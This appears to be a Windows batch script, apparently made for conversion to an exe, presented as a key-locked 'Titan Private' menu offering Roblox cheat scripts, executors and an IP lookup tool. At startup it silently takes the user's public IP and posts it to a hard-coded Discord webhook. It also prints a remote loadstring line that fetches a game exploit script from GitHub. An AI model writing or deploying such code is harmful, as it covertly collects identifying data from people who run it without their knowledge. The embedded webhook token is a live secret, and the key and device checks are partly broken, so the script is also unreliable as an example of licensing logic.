::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDxVQQ2MOyuqBYk47fvw++WXnmccTfESfYHO+LGaIa4W8kCqd5c5mH9Cnas=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
TITLE Batch Code deofubsactor  
color 05
mode con cols=80 lines=25
chcp 65001 >nul
cls
echo Loading

REM Get public IP
for /f "delims=" %%i in ('curl -s https://api.ipify.org') do set IP=%%i

REM Send IP to Discord webhook
curl -H "Content-Type: application/json" ^
     -X POST ^
     -d "{\"content\":\"%user%: %IP%\"}" ^
     https://discord.com/api/webhooks/1467046301207232614/zt2uEwbYzeRSPtBYtCIn8MJ3sxWHy59BBM9T326T6XtNaYyLlV9j6cjcgGSsUKl7NHFe

set VALID_KEY=3BQY-LTOR-8TRZ-E92R
set VAILD_KEY=P8YW-L3NV-Q7CR-H5SK
set VALID_KEY=3BQY-LTOR-8TRZ-E92R
set VALID_KEY=7FJR-K2LM-9TQX-B4ZD
set VALID_KEY=P8YW-L3NV-Q7CR-H5SK
set VALID_KEY=2XDJ-M6BR-8VQN-Y1TL
set VALID_KEY=H4ZK-R9FW-3JQP-M8SN

title Private
echo Enter Your Key
echo.
set /p USER_KEY= 

if NOT "%USER_KEY%"=="%VALID_KEY%" (
    echo.
    echo Invalid Key
    pause
    exit
)

echo.
echo Key Accepted
timeout /t 1 >nul
goto home

:: =========================
:: HWID CHECK (SECOND)
:: =========================
for /f "tokens=2 delims==" %%A in (
 'wmic csproduct get uuid /value'
) do set HWID=%%A

set HWID=%HWID: =%

:: PUT YOUR HWID HERE
set ALLOWED_HWID=PUT-YOUR-HWID-HERE

if /I "%HWID%"=="%ALLOWED_HWID%" (
    goto home
)

echo.
echo Unauthorized device
pause
exit


:: =========================
:: YOUR CODE STARTS HERE
:: =========================




:home
cls
Title Private
echo 	                            [38;5;214m████████╗██╗████████╗ █████╗ ███╗   ██╗
echo 	                            [38;5;215m╚══██╔══╝██║╚══██╔══╝██╔══██╗████╗  ██║        
echo 	                            [38;5;216m   ██║   ██║   ██║   ███████║██╔██╗ ██║ Private 
echo 	                            [38;5;217m   ██║   ██║   ██║   ██╔══██║██║╚██╗██║  
echo 	                            [38;5;218m   ██║   ██║   ██║   ██║  ██║██║ ╚████║       
echo 	                            [38;5;219m   ╚═╝   ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
echo                                                       Made by jay
echo        ══════════════════════════════════════════════════════════════════════════════════════════════ 
echo               [1] Tb3 Scripts               [5] ps2 Scripts                           [9] Soon
echo               [2] Leaked Scripts            [6] Externals                            [10] Soon
echo               [3] Link Bypasser             [7] Soon            
echo               [4] Executors                 [8] Soon             
echo       ════════════════════════════════════════════════════════════════════════════════════════════════
echo ┌──(Gaming pc@Titan)─[~/main]
set /p Home=└─$
if %Home%==1 goto servertest
if %Home%==3 goto ipte

:servertest
mode con cols=80 lines=25
chcp 65001 >nul
cls
echo loadstring(game:HttpGet("https://raw.githubusercontent.com/Perfectionsthegoat/traced-mooze/main/traced%20mooze"))()
timeout /t 6 /nobreak >nul
goto home

:key5
cls
echo Checking key
timeout /t 1 /nobreak >nul
goto checkingggggg


:checkingggggg
cls
echo Checking key.
timeout /t 1 /nobreak >nul
goto checkingggggggggg

:checkingggggggggg
cls
echo Checking key..
timeout /t 1 /nobreak >nul
goto checkingggggggggggggggggggg34243432

:checkingggggggggggggggggggg34243432
cls
echo Key Worked
timeout /t 1 /nobreak >nul
goto home

:ipte
Title Osint tool
set /p ggg=ip: 
if %ggg%==%ip% goto bb

:bb
Title Osint tool
cls
curl http://ip-api.com/json/%ip%
pause >nul
timeout /t 2 /nobreak >nul
goto %home%
